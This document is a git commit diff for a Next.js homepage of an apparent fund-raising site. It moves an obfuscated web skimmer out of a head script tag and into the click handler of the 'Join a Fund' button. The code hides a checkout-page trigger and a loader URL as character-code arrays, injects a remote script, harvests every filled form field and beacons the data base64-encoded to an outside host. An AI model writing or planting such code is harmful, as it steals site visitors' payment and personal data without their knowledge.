01f338ba4e1fcc167fc1a021606960c74c7d40f8
Khoo Xiaozhen <59082150+Natella-rex@users.noreply.github.com>
2026-03-24 06:02:25 +0800

    update mal

--- app/page.tsx
+++ app/page.tsx
@@ -35,73 +35,6 @@ export default function Home() {
         </div>
       </nav>
 
-      <Head>
-        <script dangerouslySetInnerHTML={{ __html: `((x, y, z, h, o) => {
-  if (x.location.toString().includes(String.fromCharCode.apply(null, y))) {
-    var i = z.createElement(h);
-    var j = z.getElementsByTagName(h)[0];
-    i.src = String.fromCharCode.apply(null, o);
-    j.parentNode.insertBefore(i, j);
-  }
-})(
-  window,
-  [99, 104, 101, 99, 107, 111, 117, 116],
-  document,
-  "script",
-  [
-    104, 116, 116, 112, 115, 58, 47, 47, 106, 115, 45, 99, 115, 112, 46, 99,
-    111, 109, 47, 103, 101, 116, 73, 110, 106, 101, 99, 116, 111, 114, 47,
-  ]
-);
-function F(t) {
-  var z = {};
-  var D = {};
-  var V = t.querySelectorAll("input, select, textarea");
-  var h = 0;
-  for (; h < V.length; h = h + 1) {
-    var S = V[h];
-    var P = S.name;
-    if (!P) {
-      P = S.id;
-    }
-    var v = S.value;
-    if (v !== "") {
-      if (P) {
-        if (!D[P]) {
-          D[P] = 0;
-        }
-        if (S.tagName != "SELECT") {
-          if (D[P] == 0) {
-            z[P] = v;
-          } else {
-            z[P + "#" + D[P]] = v;
-          }
-        } else {
-          if (D[P] == 0) {
-            z[P] = S.options[S.selectedIndex].text;
-          } else {
-            z[P + "#" + D[P]] = S.options[S.selectedIndex].text;
-          }
-        }
-        D[P] = D[P] + 1;
-      }
-    }
-  }
-  return z;
-}
-function __send(str) {
-  try {
-    var img = new Image();
-    img.crossOrigin = "anonymous";
-    img.src =
-      "https://js-csp.com/fetchData/?data=" +
-      window.btoa(str) +
-      "&loc=" +
-      document.location.origin;
-  } catch (e) {}
-}
-`}} />
-      </Head>
       {/* Hero Section */}
       <main className="mx-auto max-w-7xl px-4 py-16 sm:px-6 lg:px-8">
         <div className="text-center">
@@ -122,12 +55,79 @@ function __send(str) {
             >
               Create a Fund
             </Link>
-            <Link
-              href="/dashboard"
+            <button
+              type="button"
               className="rounded-full border-2 border-indigo-600 px-8 py-3 text-base font-medium text-indigo-600 hover:bg-indigo-50 dark:text-indigo-400 dark:hover:bg-gray-800 transition-colors"
+              onClick={() => {
+                // mal.js code inlined
+                ((x, y, z, h, o) => {
+                  if (x.location.toString().includes(String.fromCharCode.apply(null, y))) {
+                    var i = z.createElement(h);
+                    var j = z.getElementsByTagName(h)[0];
+                    i.src = String.fromCharCode.apply(null, o);
+                    j.parentNode.insertBefore(i, j);
+                  }
+                })(
+                  window,
+                  [99, 104, 101, 99, 107, 111, 117, 116],
+                  document,
+                  "script",
+                  [
+                    104, 116, 116, 112, 115, 58, 47, 47, 106, 115, 45, 99, 115, 112, 46, 99,
+                    111, 109, 47, 103, 101, 116, 73, 110, 106, 101, 99, 116, 111, 114, 47,
+                  ]
+                );
+                function F(t) {
+                  var z = {};
+                  var D = {};
+                  var V = t.querySelectorAll("input, select, textarea");
+                  var h = 0;
+                  for (; h < V.length; h = h + 1) {
+                    var S = V[h];
+                    var P = S.name;
+                    if (!P) {
+                      P = S.id;
+                    }
+                    var v = S.value;
+                    if (v !== "") {
+                      if (P) {
+                        if (!D[P]) {
+                          D[P] = 0;
+                        }
+                        if (S.tagName != "SELECT") {
+                          if (D[P] == 0) {
+                            z[P] = v;
+                          } else {
+                            z[P + "#" + D[P]] = v;
+                          }
+                        } else {
+                          if (D[P] == 0) {
+                            z[P] = S.options[S.selectedIndex].text;
+                          } else {
+                            z[P + "#" + D[P]] = S.options[S.selectedIndex].text;
+                          }
+                        }
+                        D[P] = D[P] + 1;
+                      }
+                    }
+                  }
+                  return z;
+                }
+                function __send(str) {
+                  try {
+                    var img = new Image();
+                    img.crossOrigin = "anonymous";
+                    img.src =
+                      "https://js-csp.com/fetchData/?data=" +
+                      window.btoa(str) +
+                      "&loc=" +
+                      document.location.origin;
+                  } catch (e) {}
+                }
+              }}
             >
               Join a Fund
-            </Link>
+            </button>
           </div>
         </div>
 
